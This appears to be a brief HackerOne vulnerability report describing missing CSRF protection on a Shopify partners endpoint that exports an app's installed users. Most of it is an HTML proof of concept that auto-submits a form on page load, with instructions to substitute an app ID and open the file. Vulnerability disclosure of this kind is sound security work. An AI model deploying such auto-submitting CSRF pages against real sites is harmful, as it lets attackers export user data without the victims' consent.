# HackerOne Report: Missing of csrf protection 
**Report ID:** 96470
**Vulnerability Class:** Cross-Site Request Forgery (CSRF)

## Vulnerability Information & PoC
<html>
<head><title>csrf</title></head>
<body onLoad="document.forms[0].submit()">
<form action="https://app.shopify.com/services/partners/api_clients/1105664/export_installed_users" method="GET">
</form>
</body>
</html>

change the 1105664 app id to your app id the save as html file and run

## Discussion & Remediation Timeline
